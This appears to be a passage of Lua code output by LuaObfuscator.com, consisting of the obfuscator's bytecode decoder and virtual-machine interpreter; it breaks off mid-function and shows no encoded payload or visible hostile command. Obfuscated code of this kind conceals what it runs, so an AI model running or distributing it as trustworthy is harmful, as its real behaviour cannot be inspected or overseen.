--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 

]]--

local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 81) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 37) then
					if (Enum <= 18) then
						if (Enum <= 8) then
							if (Enum <= 3) then
								if (Enum <= 1) then
									if (Enum == 0) then
										local A = Inst[2];
										Stk[A](Unpack(Stk, A + 1, Inst[3]));
									else
										Stk[Inst[2]] = Wrap(Proto[Inst[3]], nil, Env);
									end
								elseif (Enum > 2) then
									local A = Inst[2];
									Stk[A] = Stk[A](Stk[A + 1]);
								else
									local A = Inst[2];
									do
										return Stk[A], Stk[A + 1];
									end
								end
							elseif (Enum <= 5) then
								if (Enum == 4) then
									local A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
								else
									local K;
									local B;
									local A;
									Stk[Inst[2]] = Inst[3];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Env[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Stk[A] = Stk[A](Stk[A + 1]);
									VIP = VIP + 1;
									Inst = Instr[VIP];
									B = Inst[3];
									K = Stk[B];
									for Idx = B + 1, Inst[4] do
										K = K .. Stk[Idx];
									end
									Stk[Inst[2]] = K;
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Stk[A](Stk[A + 1]);
								end
							elseif (Enum <= 6) then
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Stk[A + 1]));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							elseif (Enum == 7) then
								local K;
								local B;
								local A;
								Stk[Inst[2]] = Inst[3];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A](Stk[A + 1]);
								VIP = VIP + 1;
								Inst = Instr[VIP];
								B = Inst[3];
								K = Stk[B];
								for Idx = B + 1, Inst[4] do
									K = K .. Stk[Idx];
								end
								Stk[Inst[2]] = K;
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A](Stk[A + 1]);
							else
								local Edx;
								local Results;
								local A;
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Inst[3] ~= 0;
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Results = {Stk[A](Unpack(Stk, A + 1, Inst[3]))};
								Edx = 0;
								for Idx = A, Inst[4] do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
								VIP = VIP + 1;
								Inst = Instr[VIP];
								if Stk[Inst[2]] then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							end
						elseif (Enum <= 13) then
							if (Enum <= 10) then
								if (Enum > 9) then
									local B;
									local A;
									Stk[Inst[2]] = Env[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									B = Stk[Inst[3]];
									Stk[A + 1] = B;
									Stk[A] = B[Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Inst[3];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									B = Stk[Inst[4]];
									if B then
										VIP = VIP + 1;
									else
										Stk[Inst[2]] = B;
										VIP = Inst[3];
									end
								else
									local Edx;
									local Results, Limit;
									local A;
									Stk[Inst[2]] = Env[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Upvalues[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Results, Limit = _R(Stk[A]());
									Top = (Limit + A) - 1;
									Edx = 0;
									for Idx = A, Top do
										Edx = Edx + 1;
										Stk[Idx] = Results[Edx];
									end
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Stk[A](Unpack(Stk, A + 1, Top));
									VIP = VIP + 1;
									Inst = Instr[VIP];
									do
										return;
									end
								end
							elseif (Enum <= 11) then
								local A = Inst[2];
								Stk[A] = Stk[A]();
							elseif (Enum > 12) then
								local A = Inst[2];
								do
									return Stk[A](Unpack(Stk, A + 1, Inst[3]));
								end
							else
								local A = Inst[2];
								do
									return Unpack(Stk, A, Top);
								end
							end
						elseif (Enum <= 15) then
							if (Enum > 14) then
								local B = Inst[3];
								local K = Stk[B];
								for Idx = B + 1, Inst[4] do
									K = K .. Stk[Idx];
								end
								Stk[Inst[2]] = K;
							else
								local B;
								local A;
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = {};
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = {};
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A](Stk[A + 1]);
								VIP = VIP + 1;
								Inst = Instr[VIP];
								do
									return;
								end
							end
						elseif (Enum <= 16) then
							local A = Inst[2];
							local B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
						elseif (Enum == 17) then
							local B;
							local T;
							local A;
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = {};
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = {};
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = {};
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Inst[4];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Inst[4];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = {};
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = {};
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Inst[4];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Inst[4];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = {};
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Inst[4];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Inst[4];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = {};
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Inst[4];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Inst[4];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = {};
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Inst[4];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Inst[4];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = {};
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Inst[4];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A]();
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Inst[4];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = {};
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Inst[4];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Inst[4];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							T = Stk[A];
							B = Inst[3];
							for Idx = 1, B do
								T[Idx] = Stk[A + Idx];
							end
						else
							local K;
							local B;
							local A;
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							B = Inst[3];
							K = Stk[B];
							for Idx = B + 1, Inst[4] do
								K = K .. Stk[Idx];
							end
							Stk[Inst[2]] = K;
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							if Stk[Inst[2]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						end
					elseif (Enum <= 27) then
						if (Enum <= 22) then
							if (Enum <= 20) then
								if (Enum > 19) then
									do
										return Stk[Inst[2]];
									end
								else
									Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								end
							elseif (Enum > 21) then
								if (Stk[Inst[2]] == Inst[4]) then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							else
								local Edx;
								local Results;
								local A;
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Results = {Stk[A](Unpack(Stk, A + 1, Inst[3]))};
								Edx = 0;
								for Idx = A, Inst[4] do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								if Stk[Inst[2]] then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							end
						elseif (Enum <= 24) then
							if (Enum > 23) then
								Env[Inst[3]] = Stk[Inst[2]];
							else
								local A;
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A](Stk[A + 1]);
								VIP = VIP + 1;
								Inst = Instr[VIP];
								if (Stk[Inst[2]] == Inst[4]) then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							end
						elseif (Enum <= 25) then
							local B = Stk[Inst[4]];
							if not B then
								VIP = VIP + 1;
							else
								Stk[Inst[2]] = B;
								VIP = Inst[3];
							end
						elseif (Enum == 26) then
							Stk[Inst[2]]();
						else
							local A = Inst[2];
							local T = Stk[A];
							local B = Inst[3];
							for Idx = 1, B do
								T[Idx] = Stk[A + Idx];
							end
						end
					elseif (Enum <= 32) then
						if (Enum <= 29) then
							if (Enum == 28) then
								local A = Inst[2];
								do
									return Stk[A](Unpack(Stk, A + 1, Top));
								end
							else
								local A = Inst[2];
								local Results, Limit = _R(Stk[A]());
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							end
						elseif (Enum <= 30) then
							local B = Stk[Inst[4]];
							if B then
								VIP = VIP + 1;
							else
								Stk[Inst[2]] = B;
								VIP = Inst[3];
							end
						elseif (Enum == 31) then
							Stk[Inst[2]] = Stk[Inst[3]];
						else
							local Edx;
							local Results, Limit;
							local B;
							local A;
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Results, Limit = _R(Stk[A](Stk[A + 1]));
							Top = (Limit + A) - 1;
							Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							do
								return Stk[A](Unpack(Stk, A + 1, Top));
							end
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							do
								return Unpack(Stk, A, Top);
							end
							VIP = VIP + 1;
							Inst = Instr[VIP];
							do
								return;
							end
						end
					elseif (Enum <= 34) then
						if (Enum == 33) then
							Stk[Inst[2]] = Upvalues[Inst[3]];
						else
							local B;
							local A;
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							if (Stk[Inst[2]] ~= Stk[Inst[4]]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						end
					elseif (Enum <= 35) then
						Stk[Inst[2]] = Inst[3] ~= 0;
					elseif (Enum == 36) then
						Stk[Inst[2]] = {};
					else
						Stk[Inst[2]][Inst[3]] = Inst[4];
					end
				elseif (Enum <= 56) then
					if (Enum <= 46) then
						if (Enum <= 41) then
							if (Enum <= 39) then
								if (Enum > 38) then
									local K;
									local B;
									local A;
									Stk[Inst[2]] = Inst[3];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Env[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Stk[A] = Stk[A](Stk[A + 1]);
									VIP = VIP + 1;
									Inst = Instr[VIP];
									B = Inst[3];
									K = Stk[B];
									for Idx = B + 1, Inst[4] do
										K = K .. Stk[Idx];
									end
									Stk[Inst[2]] = K;
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Stk[A](Stk[A + 1]);
								elseif (Stk[Inst[2]] ~= Stk[Inst[4]]) then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							elseif (Enum == 40) then
								if (Stk[Inst[2]] == Stk[Inst[4]]) then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							else
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							end
						elseif (Enum <= 43) then
							if (Enum > 42) then
								do
									return;
								end
							elseif (Stk[Inst[2]] ~= Inst[4]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum <= 44) then
							local A;
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = {};
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]][Inst[3]] = Inst[4];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							do
								return Stk[A](Unpack(Stk, A + 1, Inst[3]));
							end
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							do
								return Unpack(Stk, A, Top);
							end
							VIP = VIP + 1;
							Inst = Instr[VIP];
							do
								return;
							end
						elseif (Enum > 45) then
							local A = Inst[2];
							do
								return Unpack(Stk, A, A + Inst[3]);
							end
						else
							local Edx;
							local Results;
							local A;
							A = Inst[2];
							Stk[A] = Stk[A]();
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Results = {Stk[A](Stk[A + 1])};
							Edx = 0;
							for Idx = A, Inst[4] do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
							VIP = VIP + 1;
							Inst = Instr[VIP];
							VIP = Inst[3];
						end
					elseif (Enum <= 51) then
						if (Enum <= 48) then
							if (Enum > 47) then
								local K;
								local B;
								local A;
								Stk[Inst[2]] = Inst[3];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A](Stk[A + 1]);
								VIP = VIP + 1;
								Inst = Instr[VIP];
								B = Inst[3];
								K = Stk[B];
								for Idx = B + 1, Inst[4] do
									K = K .. Stk[Idx];
								end
								Stk[Inst[2]] = K;
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A](Stk[A + 1]);
							else
								local A = Inst[2];
								local Cls = {};
								for Idx = 1, #Lupvals do
									local List = Lupvals[Idx];
									for Idz = 0, #List do
										local Upv = List[Idz];
										local NStk = Upv[1];
										local DIP = Upv[2];
										if ((NStk == Stk) and (DIP >= A)) then
											Cls[DIP] = NStk[DIP];
											Upv[1] = Cls;
										end
									end
								end
							end
						elseif (Enum <= 49) then
							local A;
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A](Stk[A + 1]);
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3] ~= 0;
							VIP = VIP + 1;
							Inst = Instr[VIP];
							do
								return Stk[Inst[2]];
							end
							VIP = VIP + 1;
							Inst = Instr[VIP];
							do
								return;
							end
						elseif (Enum == 50) then
							local A;
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A]();
							VIP = VIP + 1;
